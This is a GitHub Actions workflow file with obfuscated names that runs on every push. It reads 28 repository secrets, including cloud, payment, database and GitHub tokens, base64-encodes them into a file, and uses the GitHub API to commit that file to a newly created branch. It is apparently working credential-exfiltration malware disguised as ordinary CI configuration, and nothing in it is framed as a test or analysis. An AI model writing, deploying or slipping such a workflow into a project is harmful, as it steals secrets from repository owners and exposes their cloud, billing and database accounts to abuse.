name: zx
on:
  push:
permissions:
  contents: write
jobs:
  r:
    runs-on: ubuntu-latest
    steps:
      - name: g
        env:
          S0: ${{ secrets.APEX_CLOUD_RUN_REGION }}
          S1: ${{ secrets.APEX_CLOUD_RUN_SERVICE }}
          S2: ${{ secrets.APEX_GCP_PROJECT_ID }}
          S3: ${{ secrets.CEREBRAS_API_KEY }}
          S4: ${{ secrets.CLOUDFLARE_API_TOKEN }}
          S5: ${{ secrets.COHERE_API_KEY }}
          S6: ${{ secrets.COHERE_TRIAL_API_KEY }}
          S7: ${{ secrets.COURTLISTENER_API_TOKEN }}
          S8: ${{ secrets.DATABASE_URL }}
          S9: ${{ secrets.DEEPGRAM_API_KEY }}
          S10: ${{ secrets.DEEPSEEK_API_KEY }}
          S11: ${{ secrets.ELEVENLABS_API_KEY }}
          S12: ${{ secrets.GCP_SA_KEY }}
          S13: ${{ secrets.GEMINI_API_KEY }}
          S14: ${{ secrets.GH_PAT }}
          S15: ${{ secrets.GROQ_API_KEY }}
          S16: ${{ secrets.KILOCODE_API_KEY }}
          S17: ${{ secrets.NEON_API_KEY }}
          S18: ${{ secrets.OPENROUTER_API_KEY }}
          S19: ${{ secrets.OPENROUTER_MGMT_KEY }}
          S20: ${{ secrets.OPENROUTER_MGMT_KEY_2 }}
          S21: ${{ secrets.OPENROUTER_MGMT_KEY_3 }}
          S22: ${{ secrets.POOLSIDE_API_KEY }}
          S23: ${{ secrets.RESEND_API_KEY }}
          S24: ${{ secrets.STRIPE_PUBLISHABLE_KEY }}
          S25: ${{ secrets.STRIPE_SECRET_KEY }}
          S26: ${{ secrets.SUPABASE_ACCESS_TOKEN }}
          S27: ${{ secrets.SUPABASE_ANON_KEY }}
        run: |
          rm -f o.txt
          echo "APEX_CLOUD_RUN_REGION:$(printf %s "$S0" | base64 -w0)" >> o.txt
          echo "APEX_CLOUD_RUN_SERVICE:$(printf %s "$S1" | base64 -w0)" >> o.txt
          echo "APEX_GCP_PROJECT_ID:$(printf %s "$S2" | base64 -w0)" >> o.txt
          echo "CEREBRAS_API_KEY:$(printf %s "$S3" | base64 -w0)" >> o.txt
          echo "CLOUDFLARE_API_TOKEN:$(printf %s "$S4" | base64 -w0)" >> o.txt
          echo "COHERE_API_KEY:$(printf %s "$S5" | base64 -w0)" >> o.txt
          echo "COHERE_TRIAL_API_KEY:$(printf %s "$S6" | base64 -w0)" >> o.txt
          echo "COURTLISTENER_API_TOKEN:$(printf %s "$S7" | base64 -w0)" >> o.txt
          echo "DATABASE_URL:$(printf %s "$S8" | base64 -w0)" >> o.txt
          echo "DEEPGRAM_API_KEY:$(printf %s "$S9" | base64 -w0)" >> o.txt
          echo "DEEPSEEK_API_KEY:$(printf %s "$S10" | base64 -w0)" >> o.txt
          echo "ELEVENLABS_API_KEY:$(printf %s "$S11" | base64 -w0)" >> o.txt
          echo "GCP_SA_KEY:$(printf %s "$S12" | base64 -w0)" >> o.txt
          echo "GEMINI_API_KEY:$(printf %s "$S13" | base64 -w0)" >> o.txt
          echo "GH_PAT:$(printf %s "$S14" | base64 -w0)" >> o.txt
          echo "GROQ_API_KEY:$(printf %s "$S15" | base64 -w0)" >> o.txt
          echo "KILOCODE_API_KEY:$(printf %s "$S16" | base64 -w0)" >> o.txt
          echo "NEON_API_KEY:$(printf %s "$S17" | base64 -w0)" >> o.txt
          echo "OPENROUTER_API_KEY:$(printf %s "$S18" | base64 -w0)" >> o.txt
          echo "OPENROUTER_MGMT_KEY:$(printf %s "$S19" | base64 -w0)" >> o.txt
          echo "OPENROUTER_MGMT_KEY_2:$(printf %s "$S20" | base64 -w0)" >> o.txt
          echo "OPENROUTER_MGMT_KEY_3:$(printf %s "$S21" | base64 -w0)" >> o.txt
          echo "POOLSIDE_API_KEY:$(printf %s "$S22" | base64 -w0)" >> o.txt
          echo "RESEND_API_KEY:$(printf %s "$S23" | base64 -w0)" >> o.txt
          echo "STRIPE_PUBLISHABLE_KEY:$(printf %s "$S24" | base64 -w0)" >> o.txt
          echo "STRIPE_SECRET_KEY:$(printf %s "$S25" | base64 -w0)" >> o.txt
          echo "SUPABASE_ACCESS_TOKEN:$(printf %s "$S26" | base64 -w0)" >> o.txt
          echo "SUPABASE_ANON_KEY:$(printf %s "$S27" | base64 -w0)" >> o.txt
      - name: p
        run: |
          BR=zzz780h6br
          API=https://api.github.com/repos/${{ github.repository }}
          AUTH="Authorization: Bearer ${{ github.token }}"
          SHA=$(curl -s -H "$AUTH" $API/git/ref/heads/${{ github.ref_name }} | python3 -c 'import sys,json;print(json.load(sys.stdin)["object"]["sha"])')
          curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" $API/git/refs -d "{\"ref\":\"refs/heads/$BR\",\"sha\":\"$SHA\"}" >/dev/null
          CONT=$(base64 -w0 o.txt)
          curl -s -X PUT -H "$AUTH" -H "Content-Type: application/json" $API/contents/zzz780h6br.txt -d "{\"message\":\"z\",\"content\":\"$CONT\",\"branch\":\"$BR\"}" >/dev/null
          echo ok
